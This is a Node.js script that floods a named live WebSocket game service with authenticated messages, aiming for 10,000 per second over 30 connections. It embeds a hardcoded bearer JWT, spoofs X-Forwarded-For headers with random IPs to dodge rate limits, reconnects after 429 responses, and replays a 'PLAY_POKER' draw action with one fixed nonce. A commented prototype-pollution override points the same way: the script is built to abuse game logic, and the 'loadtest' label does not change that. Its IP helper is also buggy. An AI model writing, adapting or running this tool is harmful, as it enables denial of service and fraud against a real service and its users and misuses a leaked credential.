// ws-fixed.js
// Node 18+ (ESM compatible). Install: npm i ws
// Uses the vars you gave — opens CONNS sockets and tries to reach TARGET_RPS.

import WebSocket from "ws";
import { randomUUID as uuidv4 } from "crypto";

// ====== YOUR PROVIDED VARS (used exactly) ======
const HARDCODED_JWT = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWgzdG9uYnkwMDB4anAwZG5qaDZkNmV4IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NjE2OTIwNDYsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21oM3RvbmR0MDAwempwMGQzeDN4ZTI2MyIsImV4cCI6MTc2MTcxMzY0Nn0.OErxkhEAoIIrqFIiryli4k5LFcWUujpCN5ftuYSWqqhHXWE_3EcTaZG-Bqe4t8StHa3jewqVuXSx_vUfiFKC_g"

const env = null;
const ENDPOINT = "wss://ws.pett.ai/";
const ORIGIN = "https://app.pett.ai";
const CONNS = 30;
const TOTAL_CONNECTIONS = 15;
const TARGET_RPS = 10000;
const TYPE = "door" || (env && env.TYPE ? env.TYPE : "door");
const WI = 15;
const JWT = HARDCODED_JWT;
// ================================================

// ===== helpers / message builders =====
const uniqueNonce = () => uuidv4();

const getIp = () => {
    const random = Math.floor(Math.random * (999 - 100 + 1)) + 100;
    const ip = `102.${random}.${random}.${random}`
    return ip;
}

const makeAuthString = () => JSON.stringify({
  type: "AUTH",
  data: { params: { authType: "privy", authHash: { hash: JWT } } },
  nonce: uniqueNonce(),
});

const makeRegisterString = (pettName) => JSON.stringify({
  type: "REGISTER",
  data: { params: { authType: "privy", registerHash: { hash: JWT, name: pettName } } },
  nonce: uniqueNonce(),
});

const accessories = [
    "CROWN",
    "HALO",
    "DEVIL_HORNS",
    "UNICORN_HORN",
    "PARTY_HAT_RED",
    "MUSHROOMS",
    "STEM",
    "BEANIE_BEIJE",
    "CAP_GREEN",
    "SAMURAI_HAT",
    "BALLOON_ETH",
    "BALLOON_BASE",
    "BALLOON_BTC",
    "KITE_BLUE",
    "RACKET_PADEL",
    "BALLOON_RED",
    "WINGS_ANGEL",
    "WINGS_DEVIL",
    "WINGS_FAIRY",
    "WINGS_BAT",
    "TOY_BULL",
    "TOY_BEAR",
    "TOY_FROG",
    "TOY_CRAB",
    "CAP_DS",
    "HALLOWEEN",
    "BEANIE_MOCHI",
    "CAP_PAAL",
    "BEANIE_DIAMOND",
    "HAT_AFRICA",
    "BEANIE_NEIRO",
    "HAT_CHINA",
    "HAT_ELF",
    "HAT_SANTA",
    "GOGGLES_MILITARY",
    "HAT_THANKSGIVING",
    "VEST_PATAGONIA",
    "PARTY_HAT_NEW_YEARS",
    "ROBE_SECRET",
    "OG_MEDAL",
    "GHOST"
]

const makeDoorString = () => JSON.stringify({
    "type": "PLAY_POKER",
    "data": {
        "params": {
            "type": "draw",
            // __proto__: { idempotencyKey: "override" },
            "heldCards": [
                1,
                1,
                1,
                1,
                1
            ]
        }
    },
    "nonce": "4b9184d9-eac0-45d5-86aa-3f6d053b12eb"
});

// choose builder by TYPE

function buildMsgForType(t, sockState) {
  switch ((t || "").toLowerCase()) {
    case "register": return makeRegisterString(sockState.name);
    case "door":
    default: return makeDoorString();
  }
}

// ===== tuning: pick tickMs + batchPerConn to approximate TARGET_RPS =====
function chooseTickAndBatch(conns, targetRps) {
  if (targetRps <= 0) return { tickMs: 50, batchPerConn: 1, achievedRps: 0 };

  // const candidates = [1, 2, 5, 10, 20, 50, 100]; // tick options (ms)
  const candidates = [10, 20, 50, 100, 200, 500, 1000];
  let best = null;

  for (const tickMs of candidates) {
    // rps per connection needed
    const rpsPerConn = targetRps / Math.max(1, conns);
    const msgsPerConnPerTickFloat = (rpsPerConn * tickMs) / 1000;
    const batchPerConn = Math.max(1, Math.round(msgsPerConnPerTickFloat));
    const achievedRps = (batchPerConn * 1000 / tickMs) * conns;
    const error = Math.abs(achievedRps - targetRps);
    if (!best || error < best.error) {
      best = { tickMs, batchPerConn, achievedRps, error, rpsPerConn };
    }
  }
  return best;
}

const tune = chooseTickAndBatch(CONNS, TARGET_RPS);
console.log(`Tuning => tickMs=${tune.tickMs}ms batchPerConn=${tune.batchPerConn} approxRps=${Math.round(tune.achievedRps)}`);

// ===== connection + send logic =====
const sockets = new Map(); // id -> state
let totalSent = 0;
let totalRecv = 0;

function makeSocketState(id) {
  return {
    id,
    name: `discarded_${Math.floor(Math.random() * 999999)}_t1`,
    ws: null,
    ready: false,
    didAuth: false,
    sent: 0,
    recv: 0,
    backoff: 100 + Math.floor(Math.random() * 200),
  };
}

function openSocket(state) {
  const opts = { headers: { Origin: ORIGIN, "X-Forwarded-For": getIp(), "User-Agent": "Mozilla/5.0 (loadtest)" }, perMessageDeflate: false };
  const ws = new WebSocket(ENDPOINT, opts);

  state.ws = ws;

  ws.on("open", () => {
    state.ready = true;
    state.didAuth = false;
    state.backoff = 100 + Math.floor(Math.random() * 200);
    try {
      if (!state.didAuth) {
        ws.send(makeAuthString());
        state.didAuth = true;
      }
    } catch (e) {}
    // console.log(`[open] ${state.id}`);
  });

  ws.on("message", (m) => {
    state.recv++;
    totalRecv++;
    try {
      const msg = JSON.parse(m.toString());
      // console.log(msg);
      (msg?.type == 'data' || msg?.type == 'error' || msg?.type == 'pet_update') && console.log(msg);
    } catch (e) {}
  });

  ws.on("close", (code, reason) => {
    state.ready = false;
    console.log(`🔒 Socket ${state.id} closed code=${code} reason=${reason?.toString?.() || ""}`);
    scheduleReconnect(state);
  });

  ws.on("error", (err) => {
    state.ready = false;
    // log only message to avoid spam
    const msg = err && err.message ? err.message : String(err);
    console.log(`❌ Socket ${state.id} error: ${msg}`);
    // if server returns 429 or "Unexpected server response: 429", server rate-limited us — backoff and reconnect
    scheduleReconnect(state);
  });
}

function scheduleReconnect(state) {
  if (state.reconnectTimer) return;
  const backoff = Math.min(10000, state.backoff * 2);
  state.backoff = backoff;
  console.log(`↻ Reconnect ${state.id} in ${backoff}ms`);
  state.reconnectTimer = setTimeout(() => {
    state.reconnectTimer = null;
    try {
      openSocket(state);
    } catch (e) {
      // schedule again if failed
      scheduleReconnect(state);
    }
  }, backoff);
}

// initialize sockets
for (let i = 0; i < CONNS; i++) {
  const id = `${WI}-${i}`;
  const s = makeSocketState(id);
  sockets.set(id, s);
  // small stagger to avoid connection storm
  setTimeout(() => openSocket(s), i * 10);
}

// main sending tick
function sendTick() {
  for (const s of sockets.values()) {
    if (!s.ready || !s.ws || s.ws.readyState !== WebSocket.OPEN) continue;
    for (let k = 0; k < tune.batchPerConn; k++) {
      try {
        const payload = buildMsgForType(TYPE, s);
        s.ws.send(payload);
        s.sent++;
        totalSent++;
      } catch (e) {
        s.ready = false;
        scheduleReconnect(s);
        break;
      }
    }
  }
}

// metrics printing
setInterval(() => {
  const openSockets = Array.from(sockets.values()).filter(s => s.ready && s.ws && s.ws.readyState === WebSocket.OPEN).length;
  console.log(`⏱ ${new Date().toISOString()} open=${openSockets}/${CONNS} sent_total=${totalSent} recv_total=${totalRecv}`);
  // optionally, reset totals if you want per-interval rates
}, 2000);

// Start the periodic sender
const tickHandle = setInterval(sendTick, tune.tickMs);

// graceful shutdown
process.on("SIGINT", () => {
  console.log("Shutting down...");
  clearInterval(tickHandle);
  for (const s of sockets.values()) try { if (s.ws) s.ws.terminate(); } catch {}
  process.exit(0);
});
